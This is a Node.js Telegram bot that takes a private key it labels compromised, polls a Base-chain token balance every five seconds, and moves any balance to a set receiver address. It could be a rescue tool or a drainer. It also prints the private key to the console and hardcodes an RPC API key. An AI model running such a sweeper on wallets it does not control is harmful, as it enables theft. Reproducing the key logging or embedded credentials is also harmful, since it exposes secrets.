require('dotenv').config();  // Load .env variables
const { ethers } = require("ethers");
const TelegramBot = require('node-telegram-bot-api');

// Telegram Bot token and chat ID
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });
const chatId = process.env.CHAT_ID; // Replace with your chat ID from getUpdates

// Verify that the PRIVATE_KEY and RECEIVER are loaded correctly
console.log("Loaded PRIVATE_KEY:", process.env.PRIVATE_KEY);
console.log("Loaded RECEIVER:   ", process.env.RECEIVER);

const compromisedPrivKey = process.env.PRIVATE_KEY;
const receiver = process.env.RECEIVER;

// Check if the private key and receiver are defined and valid
if (!compromisedPrivKey || !ethers.utils.isHexString(compromisedPrivKey)) {
  console.error("Invalid private key.");
  process.exit(1);  // Exit if invalid
}

if (!receiver || !ethers.utils.isAddress(receiver)) {
  console.error("Invalid receiver address.");
  process.exit(1);  // Exit if invalid
}

const tokenAddress = "0x1111111111166b7FE7bd91427724B487980aFc69"; // Update with the correct token address
const provider = new ethers.providers.JsonRpcProvider("https://base-mainnet.g.alchemy.com/v2/huLH5X0dYWGC_NbyG-0bfKQTLi3Y_GW8");

const wallet = new ethers.Wallet(compromisedPrivKey, provider);

const tokenAbi = [
  "function balanceOf(address) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)"
];

const token = new ethers.Contract(tokenAddress, tokenAbi, wallet);

let isBotRunning = false;
let tokenMonitorInterval; // To hold the interval reference

async function monitorAndSend() {
  console.log("👀 Watching for token...");
  tokenMonitorInterval = setInterval(async () => {
    const bal = await token.balanceOf(wallet.address);
    if (bal.gt(0)) {
      console.log(`⚡ Token received: ${ethers.utils.formatUnits(bal, 18)}`);
      const tx = await token.transfer(receiver, bal);
      console.log("🚀 Transfer sent:", tx.hash);
      clearInterval(tokenMonitorInterval); // Stop checking for tokens once transfer is done
      bot.sendMessage(chatId, `⚡ Token received: ${ethers.utils.formatUnits(bal, 18)}. Transfer sent: ${tx.hash}`);
      bot.sendMessage(chatId, "✅ Transfer successful. Bot stopped.");
      isBotRunning = false;  // Stop the bot after successful transfer
    } else {
      console.log("🔎 No tokens yet...");
    }
  }, 5000);
}

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  if (!isBotRunning) {
    isBotRunning = true;
    bot.sendMessage(chatId, "Bot started! I will start monitoring the token transfers.");
    monitorAndSend();
  } else {
    bot.sendMessage(chatId, "Bot is already running.");
  }
});

bot.onText(/\/stop/, (msg) => {
  const chatId = msg.chat.id;
  if (isBotRunning) {
    isBotRunning = false;
    clearInterval(tokenMonitorInterval); // Ensure that the monitoring stops when the bot stops
    bot.sendMessage(chatId, "Bot stopped. Monitoring halted.");
  } else {
    bot.sendMessage(chatId, "Bot is not currently running.");
  }
});

bot.on('polling_error', (error) => {
  console.error('Polling error:', error);
});
